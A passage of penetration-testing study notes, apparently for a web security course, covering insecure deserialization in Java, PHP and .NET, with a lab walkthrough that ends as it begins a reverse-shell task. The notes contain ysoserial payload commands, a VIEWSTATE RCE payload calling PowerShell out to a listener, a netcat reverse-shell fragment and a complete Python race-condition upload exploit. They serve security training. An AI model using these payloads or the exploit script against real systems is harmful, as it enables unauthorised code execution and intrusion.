+<p>First, <strong>SilentURLStreamHandler</strong> is used in order not to resolve the URL upon creation of the serialized object. The <strong>url</strong> variable is the user-supplied url to be resolved.</p>
+
+<ul>
+  <li>line 55, a new HashMap is defined</li>
+  <li>then, a data type java.net.URL is assigned to the Hashmap, to key <strong>u</strong></li>
+  <li>next, the hashCode of the URL is calculated. Upon, deserialization, the URL in which the hashCode was calculated will be resolved resulting in arbitrary DNS resolution.</li>
+</ul>
+
+<h3 id="arbitrary-dns-resolution-exploit">Arbitrary DNS Resolution Exploit</h3>
+<p>The payload is generated to the p.bin file, which was previously used to execute ping</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="n">ysoserial</span><span class="o">-</span><span class="n">master</span><span class="o">-</span><span class="no">SNAPSHOT</span><span class="o">.</span><span class="na">jar</span> <span class="no">URLDNS</span> <span class="nl">http:</span><span class="c1">//somethingnonexistent.com &gt; DeserLab/DeserLab-v1.0/p.bin</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>If u have Burp Suite Pro, u can use the Collaborator Client in order to generate and catch DNS requests</p>
+</blockquote>
+
+<p>DNSChief will be used as a simple DNS proxy. You can clone it from its GitHub repository:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/iphelix/dnschef
+</code></pre></div></div>
+
+<p>Add to the /etc/resolv.conf</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nameserver 127.0.0.1
+</code></pre></div></div>
+
+<p>Start the DNSChief and verify if its working properly by trying to ping a non-existent domain:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping oahsdhuasdo.com
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Now we can execute the payload (p.bin) and see if the lookup is performed</p>
+  </li>
+  <li>URLDNS payloads can be used to detect deserialization issues before you can try to attack them with full-RCE payloads</li>
+  <li>Ysoserial payloads that results in code execution rely on similarly nested objects, however, they can be a lot more complicated and involve several objects and their properties</li>
+</ul>
+
+<h3 id="troubleshooting-ysoserial">Troubleshooting Ysoserial</h3>
+<p>In order to be able to confirm whether the application is secure or not, you shoudl be familiar with the exception types that can be thrown during the attacking process.</p>
+
+<ul>
+  <li>Ysoserial is a blind exploitation tool, so apart from DNS resolution, knowing exception types might help in assessing a potential attack surface</li>
+  <li>When attacking, u should be aware of where the exception comes from. Ysoserial itself prints verbose stack traces when used incorrectly</li>
+</ul>
+
+<p>When reading the stack trace, if u encounter a <strong>ClassNotFoundException</strong>, its likely that the target application does not utilize the gadget library used by the usoserial payload. You can then try to use a different payload that targets another library</p>
+
+<ul>
+  <li>If you encountered <strong>java.io.IOException</strong> with the message <em>Cannot run program</em>, this is a good sign because your payload worked. However, the app u wanted to call is unavailable For some reason (example: it doesnt exist)</li>
+</ul>
+
+<p>When telling ysoserial to create an RCE-related payload, you should be aware of its limitations:</p>
+
+<ul>
+  <li>Output redirections and pipes are not supported</li>
+  <li>Parameters to the command cannot contain spaces; so, while:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lp</span> 4444 <span class="nt">-e</span> /bin<span class="p">;</span>sh# is ok
+python <span class="nt">-c</span> import socket<span class="p">;</span>... <span class="c"># will not work because the parameter (import socket) to Python contains a space</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="spotting-java-serialized-objects">Spotting Java Serialized Objects</h2>
+<p>Pay attention to binary data, especially if its starts with:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"aced0005"</span> hex
+<span class="s2">"rO0aB"</span>    <span class="nb">base64
+</span>looks like a list of java classes <span class="o">(</span>eg <span class="s2">"org.apache.somethig"</span>, <span class="s2">"java.lang.String"</span><span class="o">)</span>
+<span class="c"># Presence of such data may indicate that the target application is deserializing custom data.</span>
+</code></pre></div></div>
+
+<h3 id="recommended-reading">Recommended Reading</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
+- https://github.com/Coalfire-Research/java-deserialization-exploits
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md
+- https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/
+</code></pre></div></div>
+
+<h2 id="serialization-in-php">Serialization in PHP</h2>
+<p>AKA PHP Object Injection</p>
+
+<ul>
+  <li>PHP uses serialize() and unserialize() functions to store, transfer and transform whole objects.</li>
+  <li>Unlike Java, PHP Serialization is in non-binary format, looks similar to a JSON array and its human-readable.</li>
+</ul>
+
+<p>looks like:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:6:6<span class="s2">"Abcdef"</span>:1:1<span class="o">{</span>s:9:<span class="s2">"Something"</span><span class="p">;</span>s:6:<span class="s2">"Active"</span><span class="p">;</span><span class="o">}</span>
+</code></pre></div></div>
+
+<p>For example:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Booleans are serialized as <span class="s1">'b:&lt;i&gt;;'</span> <span class="c"># where i is 0 or 1 (true/false)</span>
+
+Strings are serialized as <span class="s1">'s:&lt;i&gt;:"&lt;s&gt;";'</span> <span class="c"># where is is the string length and s is the string itself</span>
+
+Arrays are serialized as <span class="s1">'a:&lt;i&gt;:{&lt;elements&gt;}'</span> <span class="c"># where i is an integer representing the number of elements in the array, and elements are zero or more serialized key value pairs of the following form, '&lt;key&gt;&lt;value&gt;'</span>
+
+Objects <span class="o">(</span>classes<span class="o">)</span> are serialized as <span class="s1">'O:&lt;i&gt;:"&lt;s&gt;":&lt;i&gt;:{&lt;properties&gt;}'</span> <span class="c"># where the first &lt;i&gt; is an integer representing the string length of &lt;s&gt; and &lt;s&gt; is the fully qualified class name</span>
+  ⇒ the second &lt;i&gt; is an integer representing the number of object properties, and &lt;properties&gt; are zero or more serialized name-value pairs
+  ⇒ In the &lt;name&gt;&lt;value&gt; pair, &lt;name&gt; is a serialized string representing the property name, and &lt;value&gt; is any value that is serializable
+  ⇒ Also, &lt;name&gt; is represented as <span class="s1">'s:&lt;i&gt;:"&lt;s&gt;";'</span> where &lt;i&gt; is an integer representing the string length of &lt;s&gt;
+
+The visibility of properties influences the value of &lt;s&gt; <span class="k">in </span>the following ways:
+  ⇒ With public properties, &lt;s&gt; is the simple name of the property
+  ⇒ With protected properties, &lt;s&gt; is the simple name of the property, prepended with <span class="se">\0</span><span class="k">*</span><span class="se">\0</span> - an asterix enclosed <span class="k">in </span>two NULL bytes <span class="o">(</span>0x00<span class="o">)</span>
+  ⇒ With private properties, &lt;s&gt; is the simple name of the property, prepended with <span class="se">\0</span>&lt;s&gt;<span class="se">\0</span> - &lt;s&gt; and enclosed <span class="k">in </span>two NULL bytes, where &lt;s&gt; is the fully qualified class name
+</code></pre></div></div>
+
+<h3 id="moreover-php-serialized-data-format">Moreover PHP serialized data format</h3>
+<p>→ http://www.phpinternalsbook.com/php5/classes_objects/serialization.html</p>
+
+<p>→ https://www.geeksforgeeks.org/php-serializing-data/</p>
+
+<blockquote>
+  <p>You might often encounter the PHP serialized data to be Base64 encoded For transportation purposes. Never leave any Base64 data uninspected.</p>
+</blockquote>
+
+<h3 id="magic-methods">Magic Methods</h3>
+<p>They are functions that are being launched dynamically once a certain trigger is present. They can be recognized in code by two underscores in the beginning of their names, For example:, <strong>__construct()</strong></p>
+
+<p>The triggers For the PHP classes are:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__construct<span class="o">()</span> is loaded upon creating a new instance of a class
+__destruct<span class="o">()</span> is loaded when no more references of a current class are present <span class="k">in </span>memory
+__wakeUp<span class="o">()</span> is loaded upon deserializing an object
+</code></pre></div></div>
+<p>Moreover</p>
+
+<p>→ https://www.php.net/manual/en/language.oop5.magic.php</p>
+
+<p><img src="/assets/images/posts/ewptx/25.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/ewptx/26.png" alt="Alt text" class="align-center" /></p>
+
+<p>First lets create a history.lol file:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">touch </span>history.lol
+</code></pre></div></div>
+
+<ul>
+  <li>Lets change the $serialize variable from <strong>history.log</strong> to <strong>history.lol</strong>. As the filename length is the same, we do not need to change the string length information in the serialized data.</li>
+</ul>
+
+<blockquote>
+  <p>We can observe the destructor function to be run on the history.lol file, which was removed. This way, we were able to manipulate serialized PHP data in order to alter the original behavior of the file.</p>
+</blockquote>
+
+<p>In this example, serialized data was passed in a variable to simplify the example</p>
+
+<p>in the real world, such data often comes from other sources, For example:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP requests parameters
+</code></pre></div></div>
+
+<p>Exploitation of such vuln was possible because:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- We had access to the <span class="nb">source </span>code, so we knew what the script exactly does
+- We had access to the original serialized payload, so we knew what to alter <span class="k">in </span>it
+- The vuln <span class="k">function </span>was implemented <span class="k">in </span>the default destructor, so the data was used after the deserialization. There could be a <span class="k">case</span> when data is unserialized but not used <span class="k">in </span>an insecure manner.
+</code></pre></div></div>
+
+<p>Unserialization logic added to the code:</p>
+
+<p><img src="/assets/images/posts/ewptx/27.png" alt="Alt text" class="align-center" /></p>
+
+<p>Upon deserialization, the class magic methods will be run so that the file will be removed in the destructor function:</p>
+
+<p><img src="/assets/images/posts/ewptx/28.png" alt="Alt text" class="align-center" /></p>
+
+<h2 id="net-serialization">.NET Serialization</h2>
+<ul>
+  <li>It uses a few different mechanisms For serialization and de-serialization of data. Data serialized using one of these mechanisms must be de-serialized using the same one.</li>
+</ul>
+
+<h3 id="net-serialization-types">.NET Serialization Types</h3>
+<p>Saving the states of objects using serialization in .NET can be done using various methods:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- BinaryFormatter
+- DataContractSerializer
+- NetDataContractSerializer
+- XML Serialization
+</code></pre></div></div>
+
+<p>BinaryFormatter serialized data to a binary file, and data serialized using XML Serialized is in human-readable, XML format</p>
+
+<ul>
+  <li>Usage of them is situational and connected to .NET internals.</li>
+  <li>We are going to see the use of Ysoserial.net, which is similar to the java one.</li>
+</ul>
+
+<p>BinaryFormmater example:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- The app serialized a string and writes the output to a file
+- The file is <span class="k">in </span>binary format, as the name implies
+</code></pre></div></div>
+
+<p>After running the application we can inspect the serialized data in the file. Indeed, its in binary format.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">type </span>data.dat
+</code></pre></div></div>
+
+<ul>
+  <li>You can expect serialized .NET data encountered in web apps to be Base64 encoded in order to conveniently send non-ASCII characters in HTTP requests and responses.</li>
+</ul>
+
+<h3 id="spotting-net-serialized-data">Spotting .NET Serialized Data</h3>
+<p>A common, but not the only place where serialized data can be foudn is when data is sent in a VIEWSTATE parameter, or .NET remoting services.</p>
+
+<ul>
+  <li>.NET remoting services can be considered part of the web application world but they are also part of the infrastructure</li>
+  <li>.NET remoting is the mechanics that allow sending pure .NET objects via TCP; however, depending on the application infrastructure, web applications may provide a layer of transport to supply data destined to a .NET remoting endpoint.</li>
+</ul>
+
+<p>Examples of exploiting .NET remoting via HTTP:
+ → https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/</p>
+
+<p>→ https://github.com/nccgroup/VulnerableDotNetHTTPRemoting/</p>
+
+<h3 id="viewstate">VIEWSTATE</h3>
+<p>Its a web parameter that is used in the majority of .NET web apps in order to persist the state of the current web page</p>
+
+<p>Viewstate is the state of the page and all its controls. Its automatically maintened across the web app by the ASP.NET framework</p>
+
+<ul>
+  <li>When a page its sent back to the client, the changes in the properties of the page and its controls are determined, and then, they are stored in the value of a hidden input field name __VIEWSTATE</li>
+  <li>With every other POST request, the __VIEWSTATE field is sent to the server together with other parameters</li>
+</ul>
+
+<h3 id="countermeasures-against-viewstate-tampering">Countermeasures against VIEWSTATE tampering</h3>
+<p>MAC Enabled option - the viewstate is signed with a cryptographic key known only by the server-side. Its configured by the following setting/option:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;page <span class="nv">enableViewStateMac</span><span class="o">=</span><span class="s2">"true"</span> /&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>In web.config or <strong>setting MAC validation in IIS manager</strong>, the latest .NET framework uses MAC validation by default</li>
+  <li>if the key is hardcoded, it might be leaked as a result of file read vulnerabilities like XXE, File inclusion or similar</li>
+</ul>
+
+<p>Its possible to encrypt the viewstate by configuring the web config:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;page <span class="nv">ViewStateEncryptionMode</span><span class="o">=</span><span class="s2">"Always"</span>/&gt;
+</code></pre></div></div>
+
+<blockquote>
+  <p>this can be done via the IIS management console too</p>
+</blockquote>
+
+<p>In order to enable the Windows server IIS, go to:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Control Panel <span class="o">&gt;</span> Programs <span class="o">&gt;</span> Turn windows features on or off
+Select Internet Information Services <span class="o">(</span>IIS<span class="o">)</span>
+
+<span class="c"># The files served by the IIS will be present in the standard directory:</span>
+c:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot
+</code></pre></div></div>
+
+<ul>
+  <li>If u set up the server correctly - restart the pc and go to http://127.0.0.1</li>
+  <li>open burp to observe the HTTP traffic</li>
+</ul>
+
+<p>In the wwwroot directory, we will create 3 files:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- hello.aspx <span class="o">(</span>the frontend logic<span class="o">)</span>
+- hello.aspx.cs <span class="o">(</span>backend<span class="o">)</span>
+- web.config <span class="o">(</span>the IIS standard config file<span class="o">)</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/ewptx/29.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/ewptx/30.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/ewptx/31.png" alt="Alt text" class="align-center" /></p>
+
+<p>The result is a text area, when u click the button the text that u wrote is displayed</p>
+
+<ul>
+  <li>The web.config file instructs the web server not to require MAC validation of the __VIEWSTATE parameter</li>
+  <li>This allow us to tamper with the parameter and the server will try to deserialize it anyway</li>
+</ul>
+
+<h3 id="test-burp">Test BURP</h3>
+<p>Go to the page, click in the button with some text and capture that on BURP</p>
+
+<ul>
+  <li>Send the request to <strong>Repeater</strong> and navigate to <strong>ViewState</strong> tab in Burp</li>
+  <li>Burp displays information that MAC is not enabled!</li>
+</ul>
+
+<p>Lets generate a payload using <strong>ysoserial.net</strong> and put it into the viewstate parameter. The payload will perform a simple HTTP request, since this is the appropriate approach before trying more specific RCE payloads</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ysoserial.exe <span class="nt">-o</span> <span class="nb">base64</span> <span class="nt">-g</span> TypeConfuseDelegate <span class="nt">-f</span> ObjectStateFormatter <span class="nt">-c</span> <span class="s2">"powershell.exe Invoke-WebRequest -Uri http://127.0.0.1:9000/abcdabcdabcd"</span>
+</code></pre></div></div>
+
+<p>We can see that the netcat listener received a request from Windows Powershell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 9000
+</code></pre></div></div>
+
+<p>The server response contains the 500 error code; Howeverm powershell is executed. Using the Process Hacker tool we can confirm that indeed IIS spawned the powershell process</p>
+
+<blockquote>
+  <p>We have achieved RCE via .NET VIEWSTATE deserialization</p>
+</blockquote>
+
+<h4 id="2nd-test---the-cs-file-was-modified">2nd test - The .cs file was modified</h4>
+
+<p><img src="/assets/images/posts/ewptx/32.png" alt="Alt text" class="align-center" /></p>
+
+<p>we can now see in BURP that VIEWSTATE parameter is no longer present in the website requests</p>
+
+<ul>
+  <li>But if we add the viewstate parameter anyway, the code execution still works</li>
+</ul>
+
+<p><img src="/assets/images/posts/ewptx/33.png" alt="Alt text" class="align-center" /></p>
+
+<p>The later is the .NET framework version, the more difficult its to tamper with the viewstate</p>
+
+<ul>
+  <li>
+    <p>If MAC validation is enabled, then it could be possible to exploit viewstate-based deserialization only if the MAC key is hardcoded (e.g. web.config)</p>
+  </li>
+  <li>
+    <p>The current default setting of IIS are to generate the key at runtime, and its different For each app</p>
+  </li>
+</ul>
+
+<p>Moreover:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817
+- https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/
+</code></pre></div></div>
+
+<p>2nd exercise - Modify the hello.aspx.cs</p>
+
+<h2 id="other-serialization">Other Serialization</h2>
+<p>Each dev language has its own deserialization logic and entry points/transportation mechanims of serialized data.</p>
+
+<ul>
+  <li>Less popular languages will result in harder exploitation of deserialization vulns, since no automated tools, like ysoserial will exist</li>
+  <li>Deserialization of untrusted data does not necessarily lead to code execution</li>
+</ul>
+
+<blockquote>
+  <p>You might often be able to view the full code of a target application on github repository</p>
+</blockquote>
+
+<p>WHen looking FOr this vuln, pay attention to:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Contains strings that are similar to method names or object names
+- Contains Binary data
+- Is <span class="k">in </span>a complex, structured form
+</code></pre></div></div>
+
+<h3 id="python-based-serialization">Python-based serialization</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://intoli.com/blog/dangerous-pickles/
+- https://lincolnloop.com/blog/playing-pickle-security/
+</code></pre></div></div>
+
+<h3 id="ruby-insecure-deserialization">Ruby Insecure Deserialization</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://blog.rubygems.org/2017/10/09/unsafe-object-deserialization-vulnerability.html
+</code></pre></div></div>
+
+<h3 id="generic-presentation-about-all-mentioned-technologies">Generic presentation about all mentioned technologies</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://insomniasec.com/downloads/publications/Deserialization%20-%20%20What%20Could%20Go%20Wrong.pdf
+</code></pre></div></div>
+
+<h3 id="examples-in-snake-yaml">Examples in Snake YAML</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858
+- https://blog.semmle.com/swagger-yaml-parser-vulnerability/
+</code></pre></div></div>
+
+<h2 id="lab-1">Lab 1</h2>
+
+<h3 id="task-1-perform-reconnaissance-and-identify-a-vulnerable-web-application">Task 1. Perform reconnaissance and identify a vulnerable web application</h3>
+
+<p>Step 1: Start the lab. Wait until the lab is ready. Once the lab is ready, the kali Linux interface will be available on the browser.</p>
+
+<p>Step 2: Scan the network with Nmap and gather the information about the target machine.</p>
+
+<p>Use the following command to get the information about open ports and services in the network.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+nmap demo.ine.local
+</code></pre></div></div>
+
+<p>Got the information about the IP address and the ports which are open in the target machine.</p>
+
+<p>Step 3: Use Dirb to list the directories of the website hosted on the server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DIRB is a command-line-based tool to brute force any directory based on wordlists.
+
+Command:
+
+dirb http://demo.ine.local/ /usr/share/dirb/wordlists/common.txt
+</code></pre></div></div>
+
+<p>Task 2. Identify exploitable conditions</p>
+
+<p>Step 1: Navigate to the target URL.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Target URL:
+http://demo.ine.local/upload/
+</code></pre></div></div>
+
+<p>Step 2: Upon entering the page and provide an “index.php?sent=OK” parameter in the end of the URL.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The application tries to <span class="nb">read </span>a file named <span class="s2">"data.ser"</span> but throws a Java-related exception.
+</code></pre></div></div>
+
+<p>Step 3: Create a sample file with the following command.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"sample text"</span> <span class="o">&gt;</span> example.txt
+</code></pre></div></div>
+
+<p>Step 4: Navigate to the upload page. The upload page allows uploading a file to an unknown location.</p>
+
+<blockquote>
+  <p>[Note] There is a brief delay before the file is uploaded, which can mean that it is being processed by a kind of back-end logic. Open two tabs on one page with sent=ok at the end and the upload page.</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Select the example.txt and click upload <span class="k">then </span>quickly switch the tabs.
+</code></pre></div></div>
+
+<p>Step 5: Upload the file using the upload page and try to read the file.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- The application moves away from any uploaded files once they are processed. To be able to <span class="nb">read </span>them on <span class="nb">time</span>, one should click the <span class="s2">"Read the file"</span> button before the upload message is displayed.
+
+- Now <span class="k">if </span>the <span class="s2">"OK"</span> button at <span class="s2">"Read the file"</span> is clicked quickly enough <span class="o">(</span>it is best to have it <span class="k">in </span>a separate tab<span class="o">)</span> <span class="k">then </span>the error message changes indicating, that possibly, the file content was deserialized unsuccessfully due to a corrupted format.
+
+- It looks like we have identified an untrusted data deserialization vulnerability, which can only be exploited when the payload file is timely delivered to the application.
+</code></pre></div></div>
+
+<p>Task 3. Achieve code execution</p>
+
+<p>To create an exploit, we will need three things:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Ysoserial payloads to try, as we <span class="k">do </span>not know which exactly will work
+2. A loop that will constantly try to upload and <span class="k">then </span><span class="nb">read </span>the file
+3. A check to identify whether code execution was achieved or not
+</code></pre></div></div>
+
+<p>Step 1: As we have so many payloads in ysoserial tools, we will create a loop with different payloads that will constantly try to upload and then read the file.</p>
+
+<p>To get list of ysoserial payloads, one of the ways can be to copy ysoserial’s output to a file, our is called yso.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar <span class="o">&gt;</span>yso  2&gt;&amp;1
+<span class="nb">cat </span>yso | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">' '</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">"@"</span> <span class="nt">-f</span> 1 <span class="o">&gt;</span> payloads.txt
+<span class="nb">sed</span> <span class="nt">-i</span> <span class="nt">-e</span> <span class="s1">'1,7d'</span>  payloads.txt
+</code></pre></div></div>
+
+<p>This commands will save the payload in the yso file and format it to make a payloads list of ysoserial tool and finally save it as payloads.txt.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>payloads.txt
+</code></pre></div></div>
+
+<p>The result will look similar to this.</p>
+
+<p>Step 2: Generate a payload for each line of the aforementioned list.</p>
+
+<blockquote>
+  <p>[Note] We are going to ping the IP of the attacker machine not the target machine.</p>
+</blockquote>
+
+<p>Change the directory to home so that we can list all the payloads easily here.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /home
+</code></pre></div></div>
+
+<p>Use the following command to generate payloads.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while </span><span class="nb">read </span>payloadname<span class="p">;</span> <span class="k">do </span>java <span class="nt">-jar</span> ../root/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar <span class="nv">$payloadname</span> <span class="s2">"ping 192.91.247.2 -c 3"</span> <span class="o">&gt;</span> <span class="nv">$payloadname</span><span class="p">;</span> <span class="k">done</span> &lt; payloads.txt
+</code></pre></div></div>
+
+<p>The result will look similar.</p>
+
+<p>Step 3: Construct an exploit in Python that will mimic using the website.</p>
+
+<p>It will need to take a list of payloads (we have them by name, we will shortly turn the list into a list of filenames). Moreover, the exploit will need to issue two requests one after the other - the “upload” one and immediately after it the “read file” one.</p>
+
+<p>In the below examples we are using Python 3. Note we are accessing the target machine website so we need to use that IP address.</p>
+
+<p>The “read file” request might look like the one below.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def readfile<span class="o">(</span>filename<span class="o">)</span>:
+  url <span class="o">=</span> <span class="s2">"http://demo.ine.local/upload/index.php?sent=OK"</span>
+  r <span class="o">=</span> requests.get<span class="o">(</span>url<span class="o">)</span>
+  print<span class="o">(</span><span class="s2">"[+] Used filename: "</span> + filename<span class="o">)</span>
+  print<span class="o">(</span>r.text<span class="o">)</span>
+  print<span class="o">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>Then, the “upload_file” request can be similar to the below.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def upload<span class="o">(</span>filename<span class="o">)</span>:
+  url <span class="o">=</span> <span class="s2">"http://demo.ine.local/upload/upload.php"</span>
+  files <span class="o">={</span><span class="s1">'uploaded_file'</span>: open<span class="o">(</span>filename, <span class="s1">'rb'</span><span class="o">)}</span>
+  r <span class="o">=</span> requests.post<span class="o">(</span>url, <span class="nv">files</span><span class="o">=</span>files<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Step 4: We will also need a list of all payload files by their name. Since each file is named after the payload, we can use the “yso” file again to generate a list (as we don’t want to retype it manually).</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while </span><span class="nb">read </span>payload<span class="p">;</span> <span class="k">do</span> /root/payloads.txt <span class="nb">echo</span> <span class="se">\'</span><span class="nv">$payload</span><span class="se">\'</span>, <span class="o">&gt;&gt;</span> /root/p2.txt<span class="p">;</span> <span class="k">done</span> &lt; /root/payloads.txt
+</code></pre></div></div>
+
+<p>The result will look similar.</p>
+
+<p>The list can be pasted directly into a Python program (the last comma after the last payload has to be deleted)</p>
+
+<p>To sequentially run them and then use “read file” immediately, we need to implement the concept of threading. If we simply run the two functions above one after the other, readfile() will wait for upload() until it finishes. By this time, the target file will be gone.</p>
+
+<p>Threading will simply start upload() in another thread which will allow readfile() to run without waiting for the response of upload().</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>payload <span class="k">in </span>payloads:
+  <span class="nv">x</span><span class="o">=</span>threading.Thread<span class="o">(</span><span class="nv">target</span><span class="o">=</span>upload, <span class="nv">args</span><span class="o">=(</span>payload,<span class="o">))</span>
+  x.start<span class="o">()</span>
+  readfile<span class="o">()</span>
+  time.sleep<span class="o">(</span>2<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Before running the exploit check if you have started a listener to detect pings - e.g. Wireshark or tcpdump.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcpdump <span class="nt">-i</span> eth1 icmp
+</code></pre></div></div>
+
+<p>Step 5: Copy and paste the code and save it as exploit.py. We can now clear the list in the exploit, so its final shape will be similar to the below.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import requests
+import <span class="nb">time
+</span>import threading
+def readfile<span class="o">(</span>filename<span class="o">)</span>:
+  url <span class="o">=</span> <span class="s2">"http://demo.ine.local/upload/index.php?sent=OK"</span>
+  r <span class="o">=</span> requests.get<span class="o">(</span>url<span class="o">)</span>
+  print<span class="o">(</span><span class="s2">"[+] Used filename: "</span> + filename<span class="o">)</span>
+  print<span class="o">(</span>r.text<span class="o">)</span>
+  print<span class="o">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
+def upload<span class="o">(</span>filename<span class="o">)</span>:
+  url <span class="o">=</span> <span class="s2">"http://demo.ine.local/upload/upload.php"</span>
+  files <span class="o">={</span><span class="s1">'uploaded_file'</span>: open<span class="o">(</span>filename, <span class="s1">'rb'</span><span class="o">)}</span>
+  r <span class="o">=</span> requests.post<span class="o">(</span>url, <span class="nv">files</span><span class="o">=</span>files<span class="o">)</span>
+payloads <span class="o">=</span> <span class="o">[</span>
+<span class="s1">'CommonsCollections2'</span>
+<span class="o">]</span>
+
+<span class="k">for </span>payload <span class="k">in </span>payloads:
+  <span class="nv">x</span><span class="o">=</span>threading.Thread<span class="o">(</span><span class="nv">target</span><span class="o">=</span>upload, <span class="nv">args</span><span class="o">=(</span>payload,<span class="o">))</span>
+  x.start<span class="o">()</span>
+  readfile<span class="o">(</span>payload<span class="o">)</span>
+  time.sleep<span class="o">(</span>2<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Step 6: Execute the exploit code by the following command.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python exploit.py
+</code></pre></div></div>
+
+<p>The result is code execution!</p>
+
+<p>After a short, while seeing different responses for each payload, we can see that when CommonsCollections2 is used, pings start to appear.</p>
+
+<p>Task 4. Obtain a reverse shell</p>
+
+<p>To establish a reverse shell we will need to issue a command or series of commands. Keep in mind that in Java deserialization, you can use spaces in the commands, but you cannot use spaces in the arguments of the commands.</p>
+
+<p>Step 1: Create a shell script to get the reverse shell from the target machine.</p>
+
